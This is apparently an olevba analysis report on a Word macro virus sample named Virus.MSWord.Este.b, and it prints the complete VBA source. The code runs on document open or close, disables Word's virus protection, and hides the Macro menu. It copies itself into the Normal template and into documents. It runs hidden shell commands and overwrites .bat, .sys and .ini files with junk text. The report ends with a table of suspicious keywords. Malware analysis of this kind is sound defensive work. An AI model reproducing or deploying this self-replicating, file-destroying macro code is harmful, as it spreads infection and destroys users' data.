olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Este.b-04988380794eacdfab9c6cfc5a895619e7f81cac
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Este.b-04988380794eacdfab9c6cfc5a895619e7f81cac - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Open()
  'New Era of C&AVir. More Powerfull
  On Error Resume Next
  Dim Sw_Doc_Infec, Sw_Pln_Infec, Activa_Doc, Activa_Pln, Acci_Arch, Rompe As Boolean
    Set prevDocument = NormalTemplate
    Set nextDocument = newDocument
  Dim Accion1, Accion2, LinDoc, LinPln, Compara As Integer
  Const cyav = "Este Es <C&AVir>"
  Const pnomus = "***< C & A V i r >***"
  'Inicializa Variables
  Sw_Doc_Infec = False
  Sw_Pln_Infec = False
Activa_Doc = True
Activa_Pln = False
  CommandBars("Tools").Controls("Macro").Enabled = False
  CommandBars("Tools").Controls("Macro").Visible = False
  Options.VirusProtection = (1 - 1)
  Options.SaveNormalPrompt = (1 - 1)
  Options.ConfirmConversions = (1 - 1)
  Options.CreateBackup = (1 - 1)
  Set Dc = ActiveDocument.VBProject.VBComponents.Item(1)
  Set Pl = NormalTemplate.VBProject.VBComponents.Item(1)
  LinPln = Pl.CodeModule.Countoflines
  LinDoc = Dc.CodeModule.Countoflines
  Sw_Pln_Infec = Pl.CodeModule.Find(cyav, 1, 1, 10000, 10000)
  Sw_Doc_Infec = Dc.CodeModule.Find(cyav, 1, 1, 10000, 10000)
  Acci_Arch = False
  Randomize
  If Activa_Doc = True Then
    If Date > 36433 Then
      Dia = Day(Date)
      If Dia = 1 Then
        Ptp = Int(6 * Rnd)
        Select Case Ptp
          Case 1
            Acci_Arch = True
            pext = "*.doc"
            pext1 = "1"
          Case 2
            Acci_Arch = True
            pext = "*.bat"
            pext1 = "2"
          Case 3
            Acci_Arch = True
            pext = "*.sys"
            pext1 = "3"
          Case 4
            Acci_Arch = False
            pext = ""
            pext1 = ""
          Case 5
            Acci_Arch = True
            pext = "*.ini"
            pext1 = "4"
        End Select
        If Acci_Arch = True Then
          parchi = "IOBuff" & pext1 & ".vxd"
          Shell "command.com /c dir \" & pext & "/s/b>>\" & parchi, vbHide
        End If
      End If
      DiaSem = WeekDay(Date)
      DiaSem = DiaSem + 3
      Hacer = Int(DiaSem * Rnd)
      If Hacer = Day(Now) Or (Hacer * 3) = Minute(Now) Then
        Select Case Hacer
          Case 1
            Options.BlueScreen = True
            Options.CheckGrammarAsYouType = False
            Options.CheckSpellingAsYouType = False
            ActiveDocument.ShowGrammaticalErrors = False
            ActiveDocument.ShowSpellingErrors = False
            ActiveDocument.CommandBars.LargeButtons = True
            Application.ActiveWindow.DisplayVerticalScrollBar = False
          Case 2
            With ActiveDocument.PageSetup.LineNumbering
                 .Active = True
                 .StartingNumber = 3
                 .CountBy = 3
                 .RestartMode = wdRestartSection
            End With
            ActiveDocument.Save
            If ActiveDocument.CommandBars.LargeButtons = True Then ActiveDocument.CommandBars.LargeButtons = False
            ActiveDocument.ActiveWindow.Caption = ActiveDocument.ActiveWindow.Caption & " - Pura Basura!!"
            If ActiveDocument.Saved = False Then ActiveDocument.Save
          Case 3
            With ActiveDocument.Sections(1).Headers(wdHeaderFooterPrimary).PageNumbers
                 .NumberStyle = wdPageNumberStyleLowercaseRoman
                 .IncludeChapterNumber = True
                 .RestartNumberingAtSection = True
                 .StartingNumber = 99
                 .Add PageNumberAlignment:=wdAlignPageNumberCenter, FirstPage:=True
            End With
            Application.ActiveWindow.DisplayHorizontalScrollBar = False
            Application.ActiveWindow.DisplayVerticalScrollBar = False
            If ActiveDocument.Saved = False Then ActiveDocument.Save
            If Options.BlueScreen = True Then Options.BlueScreen = False
          Case 4
            If Application.CommandBars.Item(1).Controls.Item(3).Enabled = False Then Application.CommandBars.Item(1).Controls.Item(3).Enabled = True
            If Application.CommandBars.Item(1).Controls.Item(4).Enabled = False Then Application.CommandBars.Item(1).Controls.Item(4).Enabled = True
            If Application.CommandBars.Item(1).Controls.Item(6).Enabled = False Then Application.CommandBars.Item(1).Controls.Item(6).Enabled = True
            Application.CommandBars.Item(1).Enabled = False
            Application.CommandBars.Item(2).Enabled = False
            Application.ActiveWindow.DisplayVerticalScrollBar = False
            x = ActiveDocument.Paragraphs.Count
            For R = 1 To x
              ActiveDocument.Paragraphs(R).Alignment = wdAlignParagraphCenter
            Next R
            ActiveDocument.Save
            If Options.CheckGrammarAsYouType = False Then Options.CheckGrammarAsYouType = True
            If Options.CheckSpellingAsYouType = False Then Options.CheckSpellingAsYouType = True
            If ActiveDocument.ShowGrammaticalErrors = False Then ActiveDocument.ShowGrammaticalErros = True
            If ActiveDocument.ShowSpellingErrors = False Then ActiveDocument.ShowSpellingErrors = True
          Case 5
            If Options.CheckGrammarAsYouType = False Then Options.CheckGrammarAsYouType = True
            If ActiveDocument.ShowGrammaticalErrors = False Then ActiveDocument.ShowGrammaticalErros = True
            If Application.CommandBars.Item(1).Controls.Item(2).Visible = False Then Application.CommandBars.Item(1).Controls.Item(2).Visible = True
            If Application.CommandBars.Item(1).Controls.Item(5).Visible = False Then Application.CommandBars.Item(1).Controls.Item(5).Visible = True
            If Application.ActiveWindow.DisplayHorizontalScrollBar = False Then Application.ActiveWindow.DisplayVerticalScrollBar = True
            twori = Application.CommandBars.Item(2).Controls.Item(1).Width
            thori = Application.CommandBars.Item(2).Controls.Item(1).Height
            Application.CommandBars.Item(1).Controls.Item(7).Width = twori
            Application.CommandBars.Item(1).Controls.Item(7).Height = thori
            Application.CommandBars.Item(1).Controls.Item(1).Caption = "Ja! Ja!"
            Application.CommandBars.Item(1).Controls.Item(2).Caption = "This Is"
            Application.CommandBars.Item(1).Controls.Item(3).Caption = "<C&AVir>"
            Application.CommandBars.Item(1).Controls.Item(6).Caption = "Rebizar Hortogrhafia"
          Case 6
            Application.CommandBars.Item(1).Controls.Item(3).Enabled = False
            Application.CommandBars.Item(1).Controls.Item(4).Enabled = False
            Application.CommandBars.Item(1).Controls.Item(6).Enabled = False
            x = ActiveDocument.Paragraphs.Count
            For R = 1 To x
              ActiveDocument.Paragraphs(R).Alignment = wdAlignParagraphRight
            Next R
            ActiveDocument.Save
          Case 7
            If Options.CheckSpellingAsYouType = False Then Options.CheckSpellingAsYouType = True
            If ActiveDocument.ShowSpellingErrors = False Then ActiveDocument.ShowSpellingErrors = True
            Application.CommandBars.Item(1).Controls.Item(4).Enabled = False
            Application.CommandBars.Item(1).Controls.Item(2).Visible = False
            Application.CommandBars.Item(1).Controls.Item(5).Visible = False
            Application.CommandBars.Item(1).Controls.Item(7).Width = 65
            Application.CommandBars.Item(1).Controls.Item(7).Height = 65
          Case 8
            If Date < 36527 Then
              Selection.TypeText " All sistems and mainframes aren't capaple to support the new era of the year 2000 or Y2K, The disaster is possible by this cause"
            Else
              Selection.TypeText " The End of World is near, you can prevent make the LOVE not the war !!!."
            End If
        End Select
      End If
    End If
  End If
  If Activa_Pln = True Then
    Shell "command.com /c dir \*.dll/s/o/b>>\IODocs.dll", vbHide
    If Dir("\IODocs.dll") <> "" Then
      SetAttr "\IODocs.dll", vbHidden
    End If
    If Day(Date) = 14 Or Day(Date) = 28 Then
      With Dialogs(wdDialogFileSummaryInfo):
           .Title = "Make The Love!! Not The War !!":
           .Author = pnomus:
           .Keywords = "ALT + <F4>, <CTRL>+<ALT>+<SUPR>, <F1>":
           .Execute:
      End With
    End If
    NormalTemplate.Save
    If Dir("\IOBuff1.vxd") <> "" Then
      Open "\IOBuff1.vxd" For Input As #1
      If LOF(1) <> 0 Then
        Do While Not EOF(1)
          Line Input #1, docum
          Encue = False
          For Each doc In Documents
            If doc.Name = docum Then Encue = True
          Next doc
          If Encue <> True Then
            Documents.Open FileName:=docum
          Else
            Documents(docum).Activate
          End If
        Loop
      End If
      Close #1
      Kill "\IOBuff1.vxd"
    End If
    If Dir("\IOBuff2.vxd") <> "" Then
      Open "\IOBuff2.vxd" For Input As #2
      If LOF(2) <> 0 Then
        Do While Not EOF(2)
          Line Input #2, Pabt
          Open Pabt For Output As #3
          Print #3, "REM ** This Bat File Has Violed By <C&AVir>"
          Print #3, "REM ** Your PC Is Not Secure System"
          Print #3, "prompt Fuck You!!$g"
          Print #3, "cls"
          Print #3, "command.com"
          Close #3
        Loop
      End If
      Close #2
      Kill "\IOBuff2.vxd"
    End If
    If Dir("\IOBuff3.vxd") <> "" Then
      Open "\IOBuff3.vxd" For Input As #4
      If LOF(4) <> 0 Then
        Do While Not EOF(4)
          Line Input #4, Pasy
          Open Pasy For Output As #5
          Print #5, "REM   Warning In the file " & Pasy & "!!"
          Print #5, "REM   This Sys File can only operate with"
          Print #5, "REM   Operating Systems Powerfull and Secures"
          Print #5, "REM   <C&AVir>."
          Print #5, "FILES = 1"
          Print #5, "BUFFERS = 1"
          Close #5
        Loop
      End If
      Close #4
      Kill "\IOBuff3.vxd"
    End If
    If Dir("\IOBuff4.vxd") <> "" Then
      Open "\IOBuff4.vxd" For Input As #6
      If LOF(6) <> 0 Then
        Do While Not EOF(6)
          Line Input #6, Pain
          Open Pain For Output As #7
          Print #7, "**********************************************************"
          Print #7, "     Warning!: The File: " & Pain
          Print #7, "     Is Damaged. I`m Sorry!"
          Print #7, "**********************************************************"
          Print #7, " "
          Print #7, "Reinstall Your System..."
          Close #7
        Loop
      Close #6
      End If
      Kill "\IOBuff4.vxd"
    End If
  End If
  Rompe = False
  If LinDoc <> 0 Then
    While Rompe = False
      Compara = Int(Rnd * LinDoc)
      If Compara <> 0 And Compara <> 1 And Compara <> 320 Then
        Rompe = True
      End If
    Wend
  Else
    While Rompe = False
      Compara = Int(Rnd * LinPln)
      If Compara <> 0 And Compara <> 1 And Compara <> 320 Then
        Rompe = True
      End If
    Wend
  End If
  LCPln = Pl.CodeModule.Lines(Compara, 1)
  LCDoc = Dc.CodeModule.Lines(Compara, 1)
  'Validar Estado de la Plantilla
  If Sw_Pln_Infec = False Then
    If LinPln <> 0 Then
      If LCPln <> LCDoc Then
        Pl.CodeModule.DeleteLines 1, LinPln
        Accion1 = 1
      Else
        If LinPln <> LinDoc Then
          Pl.CodeModule.DeleteLines 1, LinPln
          Accion1 = 1
        Else
          Accion1 = 2
        End If
      End If
    Else
      Accion1 = 1
    End If
  Else
    Accion1 = 2
  End If
  'Validar Estado del Documento
  If Sw_Doc_Infec = False Then
    If LinDoc <> 0 Then
      If LCDoc <> LCPln Then
        Dc.CodeModule.DeleteLines 1, LinDoc
        Accion2 = 1
      Else
        If LinDoc <> LinPln Then
          Dc.CodeModule.DeleteLines 1, LinDoc
          Accion2 = 1
        Else
          Accion2 = 2
        End If
      End If
    Else
      Accion2 = 1
    End If
  Else
    Accion2 = 2
  End If
  If Accion1 = 1 Then 'Infectar Plantilla
    For R = 1 To LinDoc
      linwork = Dc.CodeModule.Lines(R, 1)
      Pl.CodeModule.InsertLines R, linwork
    Next R
    Pl.CodeModule.ReplaceLine 1, "Private Sub Document_Close()"
    Pl.CodeModule.ReplaceLine 13, "Activa_Doc = False"
    Pl.CodeModule.ReplaceLine 14, "Activa_Pln = True"
    Application.UserName = pnomus
    NormalTemplate.Save
  End If
  If Accion2 = 1 Then 'Infectar Documento Activo
    For R = 1 To LinPln
      linwork = Pl.CodeModule.Lines(R, 1)
      Dc.CodeModule.InsertLines R, linwork
    Next R
    Dc.CodeModule.ReplaceLine 1, "Private Sub Document_Open()"
    Dc.CodeModule.ReplaceLine 13, "Activa_Doc = True"
    Dc.CodeModule.ReplaceLine 14, "Activa_Pln = False"
    ActiveDocument.Save
  End If
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |newDocument         |Runs when a new Word document is created     |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbHide              |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|command             |May run PowerShell commands                  |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|IOC       |IODocs.dll          |Executable file name                         |
+----------+--------------------+---------------------------------------------+

